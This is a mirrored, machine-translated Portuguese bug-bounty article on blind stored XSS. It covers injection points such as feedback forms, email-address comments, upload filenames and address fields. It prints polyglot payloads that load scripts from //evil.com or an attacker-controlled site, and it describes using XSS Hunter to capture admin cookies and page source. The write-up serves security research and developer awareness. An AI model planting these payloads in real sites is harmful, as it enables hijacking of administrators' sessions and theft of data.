<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üåõ üìì üÜì Ca√ßa ao bug, XSS √†s cegas e truques da Fox üà∑Ô∏è üçú üßóüèΩ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="As raposas sabem muito sobre a ca√ßa :) 

 Muitos provavelmente j√° ouviram falar do BugBounty , uma busca por vulnerabilidades de recompensas e hist√≥ri...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Ca√ßa ao bug, XSS √†s cegas e truques da Fox</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/post/470818/"><img src="https://habrastorage.org/webt/cj/pb/wn/cjpbwn1yerqychbqibvqema9phk.jpeg"><br>  <i>As raposas sabem muito sobre a ca√ßa :)</i> <br><br>  Muitos provavelmente j√° ouviram falar do <b>BugBounty</b> , uma busca por vulnerabilidades de recompensas e hist√≥rias relacionadas a ele.  Como um dos ‚Äúca√ßadores de bugs‚Äù, comecei minha jornada h√° pouco mais de um ano no site <b>HackerOne</b> .  Durante esse tempo, consegui aprender muito sobre os diferentes tipos de vulnerabilidades, ganhar muita experi√™ncia e agora gostaria de compartilhar isso com a comunidade. <br><br>  Neste artigo, quero falar sobre um tipo de vulnerabilidade, como <b>scripts entre sites</b> cegos ou <b>scripts</b> entre sites armazenados ocultos, se traduzidos para o russo.  Convido voc√™ a conhecer o gato, se voc√™ estiver interessado em tais t√≥picos ou quiser melhorar a seguran√ßa do seu aplicativo. <br><a name="habracut"></a><br>  Muitos aplicativos da web t√™m um painel administrativo ou suas outras varia√ß√µes que permitem controlar o conte√∫do do site, gerenciar dados do usu√°rio e executar muitas outras a√ß√µes privilegiadas.  O portal administrativo pode ser protegido pelo acesso a um pool espec√≠fico de endere√ßos IP, cookies somente HTTP e, √© claro, autoriza√ß√£o. <br><br>  No entanto, todos esses mecanismos de prote√ß√£o podem ser contornados se o conte√∫do digitado pelo usu√°rio for malicioso e o aplicativo n√£o limpar adequadamente as informa√ß√µes enviadas pelo usu√°rio. <br><br><h3>  Ferramentas para uso </h3><br>  Primeiro, vamos nos familiarizar com as ferramentas que nos permitir√£o explorar com √™xito o <b>Blind-XSS</b> descoberto.  Difere de outras vulnerabilidades pelo m√©todo de explora√ß√£o.  Ao enviar uma mensagem maliciosa, n√£o sabemos se o <b>JavaScript foi</b> integrado com √™xito nas p√°ginas <b>HTML</b> ou n√£o.  O c√≥digo malicioso ser√° executado somente quando o administrador visitar a p√°gina com esse c√≥digo.  Caso contr√°rio, talvez nunca saibamos se o ataque foi bem-sucedido ou n√£o. <br><br>  Todos os tipos de estruturas criadas exclusivamente para inje√ß√£o de Blind-XSS podem nos fornecer assist√™ncia operacional: <br><br><ol><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">XSS Hunter</a> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">GitHub</a> ) - um dos frameworks mais populares </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">ezXSS</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">bXSS</a> (com notifica√ß√£o por SMS) </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">elScripto</a> </li></ol><br>  E muitos outros.  Cada estrutura possui suas pr√≥prias peculiaridades; portanto, cada ca√ßador de bagagens escolhe a que for mais conveniente e adequada √†s suas necessidades.  Como uso o <b>XSS Hunter</b> , mais adiante neste artigo, apresentarei seus recursos e como us√°-los para obter o melhor resultado. <br><br>  Depois de configurar a estrutura, voc√™ preparar√° cargas √∫teis que podem ser aplicadas em diferentes situa√ß√µes, mas os poliglotas s√£o mais frequentemente usados, por exemplo: <br><br><pre><code class="html hljs xml">\--&gt;'&gt;<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">style</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">article</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">//evil.com</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><h3>  Ponto de entrada ou ponto de inje√ß√£o </h3><br>  Todos os pontos de entrada s√£o unidos pelo fato de que as informa√ß√µes inseridas neles n√£o s√£o devidamente eliminadas do c√≥digo JavaScript e permitem a implementa√ß√£o desse c√≥digo na estrutura HTML da p√°gina administrativa.  Na minha opini√£o, o ponto de entrada mais popular √© uma mensagem de suporte. <br><br>  Considere aqueles que eu conhe√ßo. <br><br>  <b>1. Formul√°rio de Feedback</b> <br><br>  Como regra, neste formul√°rio existem campos como: <br><br><ol><li>  posi√ß√£o </li><li>  mensagem </li><li>  √†s vezes, um endere√ßo de email, caso o administrador queira entrar em contato com o autor da mensagem. </li></ol><br>  Cada um desses campos pode estar vulner√°vel √† inje√ß√£o de JavaScript.  Mas h√° um pequeno truque aqui: <br><blockquote>  Se voc√™ vir o campo Endere√ßo de email, n√£o se apresse em desistir, se ele n√£o aceitar nada al√©m da estrutura de Email.  Tente: <code>- "payload"@domain.com <br> - name@"payload"domain.com <br> - name(payload)@domain.com <br> - name@(payload)domain.com <br> - name@domain.com(payload)</code> <code>- "payload"@domain.com <br> - name@"payload"domain.com <br> - name(payload)@domain.com <br> - name@(payload)domain.com <br> - name@domain.com(payload)</code> </blockquote>  As aspas e colchetes s√£o uma parte v√°lida do endere√ßo de email e s√£o coment√°rios de acordo com as especifica√ß√µes da <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">RFC 2822</a> (se√ß√£o 3.4.1), <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">RFC 3696</a> (se√ß√£o 3). <br><br>  Metade das minhas inje√ß√µes bem-sucedidas √© apenas a inje√ß√£o atrav√©s do coment√°rio do endere√ßo de e-mail.  Na maioria das vezes, a verifica√ß√£o no lado do cliente (navegador) ainda n√£o permitir√° o uso desse email.  Mas sabemos que verificar o cliente n√£o significa nada para n√≥s: <br><br><div class="spoiler">  <b class="spoiler_title">Brevemente sobre valida√ß√£o do lado do cliente e hackers</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/_v/wg/7l/_vwg7lirapz_keillrb-2imiafa.jpeg"><br></div></div><br>  Portanto, o endere√ßo de email precisa ser substitu√≠do apenas no processo de envio de uma solicita√ß√£o usando qualquer aplicativo proxy (por exemplo, Burp Suite). <br><br>  <b>2. Formul√°rios para reclama√ß√µes / sugest√µes / avalia√ß√µes</b> <br><br>  Certamente voc√™ costumava ver a frase <i>"O artigo √© √∫til?"</i>  (Avalie este artigo) em portais de suporte ou com documenta√ß√£o.  Ao clicar no bot√£o "N√£o", eles podem nos oferecer uma mensagem do motivo pelo qual o artigo n√£o foi √∫til e o que pode ser melhorado.  Voc√™ provavelmente j√° entendeu onde estaria nossa carga √∫til nesse caso. <br><br>  Portanto, se voc√™ v√™ ofertas semelhantes para enviar feedback, definitivamente deve prestar aten√ß√£o a elas e enviar uma carga √∫til, que no final pode ser bem-sucedida. <br><br>  <b>3. Registro de conta</b> <br><br>  Sim, ao registrar uma conta, √© extremamente improv√°vel que nossa conta seja vista em algum lugar do painel administrativo; no entanto, ao inserir a carga no endere√ßo de e-mail, podemos us√°-lo posteriormente para enviar mensagens para o site como um usu√°rio registrado.  Ao mesmo tempo, os pr√≥prios formul√°rios exibir√£o automaticamente nosso endere√ßo no painel administrativo, apesar de n√£o ter sido solicitado diretamente ao enviar qualquer formul√°rio ou mensagem. <br><br>  <b>4. Suporte ao Cliente</b> <br><br>  O ponto de entrada mais √≥bvio e sendo explorado com mais frequ√™ncia.  Cada formul√°rio para solicitar servi√ßos de suporte pode ser muito diferente um do outro, portanto, preste aten√ß√£o em todos os campos nos quais voc√™ pode inserir uma carga √∫til. <br><br>  A capacidade de baixar arquivos merece aten√ß√£o especial.  Outro truque √© que a carga √∫til pode ser deixada no nome do arquivo, por exemplo: <br><br><pre> <code class="html hljs xml">Screenshot - 12.03.2019 12_05_52"&gt;<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">//mysite.com/1.js</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"><span class="undefined">.jpeg.html</span></span></code> </pre> <br>  E deixe o mesmo script no pr√≥prio arquivo (obrigado a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" class="user_link">w9w</a> por encontrar). <br><br>  <b>5. Endere√ßo de entrega / empresa / domic√≠lio</b> <br><br>  O endere√ßo tamb√©m √© frequentemente usado ao interagir com o usu√°rio, quando ele precisa enviar algo no caso de um servi√ßo de entrega, uma loja, reserva de hotel ou outro aplicativo que processa endere√ßos. <br><br>  O campo de endere√ßo √© bastante comum e, algumas vezes, a valida√ß√£o ocorre no n√≠vel de um endere√ßo existente.  Portanto, pode ser necess√°rio inserir o endere√ßo real no in√≠cio e indic√°-lo no mapa, e j√° no processo de envio da solicita√ß√£o, adicionar a carga √∫til ao endere√ßo v√°lido para ignorar as verifica√ß√µes do aplicativo. <br><br>  <b>6. APIs ocultas</b> <br><br>  √Äs vezes, ao aprender o c√≥digo JavaScript, voc√™ pode encontrar pontos de extremidade da API que n√£o est√£o em uso no aplicativo.  Pode ser, por exemplo, o envio de informa√ß√µes sobre erros, depura√ß√£o e similares.  √â poss√≠vel formar uma solicita√ß√£o com base em JS e enviar uma mensagem com uma carga √∫til. <br><br><h3>  Mecanismos de prote√ß√£o p√≥s-opera√ß√£o e desvio </h3><br>  Tendo recebido um feedback da opera√ß√£o bem-sucedida do Blind-XSS, muitos t√™m pressa em relatar uma descoberta ao programa com recompensas pelas vulnerabilidades encontradas.  No entanto, na maioria das vezes, essas vulnerabilidades recebem alta prioridade, mas n√£o s√£o cr√≠ticas.  Temos v√°rias maneiras de provar o dano cr√≠tico de uma poss√≠vel explora√ß√£o de uma vulnerabilidade. <br><br>  <b>1. Aprendendo os pain√©is HTML de origem</b> <br><br>  A cada opera√ß√£o bem-sucedida, o <b>XSS Hunter</b> nos envia informa√ß√µes como: <br><br>  1. Cookie do usu√°rio <br>  2. Usu√°rio agente do usu√°rio <br>  3. endere√ßo IP do usu√°rio <br>  4. URL da p√°gina na qual o script √© executado <br>  5. c√≥digo fonte HTML da p√°gina <br>  6. captura de tela da p√°gina <br>  7. Indicador <br><br><img src="https://habrastorage.org/webt/mu/cj/dt/mucjdt3mbv8ovtilfz6wvyfxf8e.png"><br><br>  Como regra, n√£o h√° cookies de sess√£o, pois eles t√™m o atributo Somente HTTP.  Nesse caso, o mais √∫til para n√≥s √© o c√≥digo fonte da p√°gina HTML.  Nele, entre outras coisas, voc√™ pode encontrar JavaScript.  Este c√≥digo permite entender como as solicita√ß√µes s√£o geradas para executar a√ß√µes administrativas.  √â necess√°rio estud√°-lo e tentar executar essas a√ß√µes criando uma solicita√ß√£o manualmente no Burp Suite ou em outro software similar. <br><br>  No meu caso, o painel de administra√ß√£o estava no mesmo dom√≠nio de onde eu enviei a carga, portanto, consegui abrir todos os scripts sem inje√ß√£o adicional (embora isso possa ser feito em uma inje√ß√£o).  Para minha surpresa, embora o acesso √†s se√ß√µes administrativas ainda exigisse autoriza√ß√£o, consegui enviar solicita√ß√µes √†s APIs administrativas e gerenciar o conte√∫do como se eu j√° fosse um administrador. <br><br>  Infelizmente, o programa no qual eu pude detectar essas vulnerabilidades √© privado e n√£o posso nome√°-lo ou mostrar com mais detalhes o processo de extra√ß√£o de solicita√ß√µes do c√≥digo JS. <br><br>  Como resultado dessa descoberta, consegui obter <b>$ 2500 em</b> vez de <b>$</b> <b>1000</b> como se fosse uma vulnerabilidade de alta prioridade. <br><br>  <b>2. Obtenha mais informa√ß√µes.</b> <br><br>  Mesmo se o painel administrativo estiver atr√°s do firewall e basicamente n√£o houver maneira de acess√°-lo, voc√™ ainda poder√° obter mais informa√ß√µes e aumentar a criticidade da vulnerabilidade descoberta. <br><br>  <b>O XSS Hunter</b> permite adicionar seu pr√≥prio c√≥digo JS √† carga e especificar p√°ginas adicionais para recuperar: <br><br><img src="https://habrastorage.org/webt/qt/-o/wv/qt-owvzedcm13_5mwinkhpwaoga.png"><br><br>  Ap√≥s a primeira opera√ß√£o bem-sucedida, voc√™ pode extrair p√°ginas adicionais que foram obtidas no curso do estudo do c√≥digo-fonte da p√°gina HTML.  Da mesma maneira, voc√™ pode executar solicita√ß√µes com privil√©gios de administrador, mas isso requer um c√≥digo JS mais complexo. <br><br>  Al√©m disso, acho que voc√™ pode adicionar uma extra√ß√£o HTML recursiva de outras p√°ginas do painel administrativo, nas quais informa√ß√µes confidenciais possam aparecer, mas ainda n√£o precisei recorrer a isso. <br><br><h3>  Conclus√£o </h3><br><ol><li>  Aconselho os desenvolvedores a verificar todos os seus campos relacionados aos endere√ßos de email, j√° que muitas vezes dependem de uma verifica√ß√£o padr√£o da estrutura do endere√ßo de email, sem levar em conta que √© poss√≠vel gerar um endere√ßo completamente v√°lido, mas com c√≥digo malicioso. </li><li>  Preste aten√ß√£o nos campos menores relacionados ao feedback.  Eles s√£o diferentes e √© imposs√≠vel listar todos eles. </li><li>  N√£o tenha pregui√ßa de extrair informa√ß√µes adicionais da p√°gina HTML recebida, com uma alta probabilidade de que possa aumentar sua recompensa √†s vezes. </li><li>  Tente provar um impacto cr√≠tico para cada um dos seus Blind-XSS. </li></ol><br>  Proponho que assine meu canal no <b>Telegram</b> (apenas em russo) e tamb√©m uma conta no <b>Twitter</b> (em ingl√™s), pois √© dif√≠cil coletar material para artigos t√£o grandes, mas posso publicar pequenos truques e descobertas com bastante frequ√™ncia. <br><br>  Os links podem ser encontrados abaixo. <br><br>  Tenha uma boa ca√ßada! </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt470818/">https://habr.com/ru/post/pt470818/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt470806/index.html">Problema fundamental de teste</a></li>
<li><a href="../pt470808/index.html">Astra Linux "Eagle" Common Edition: existe vida ap√≥s o Windows</a></li>
<li><a href="../pt470812/index.html">Cartucho Tarantool: Fragmento Lua Backend em tr√™s linhas</a></li>
<li><a href="../pt470814/index.html">Materiais do android-mitap: ferramentas para autotestes | Yandex Mapkit 3 | design de aplica√ß√£o | UI orientada a servidor</a></li>
<li><a href="../pt470816/index.html">R√∫ssia - TPA - Bielorr√∫ssia: aqui o terceiro n√£o √© de todo sup√©rfluo</a></li>
<li><a href="../pt470820/index.html">Um teste r√°pido de dezenas de hip√≥teses: como sa√≠mos da rotina e discutimos em outra cidade</a></li>
<li><a href="../pt470822/index.html">Monitoramento de temperatura na empresa</a></li>
<li><a href="../pt470824/index.html">Di√°logos Prometidos</a></li>
<li><a href="../pt470826/index.html">Mineiros, diversificadores e cobalto: como fornecemos aos clientes acesso seguro √† Internet</a></li>
<li><a href="../pt470828/index.html">Lista vinculada do Python: Gatos em caixas</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>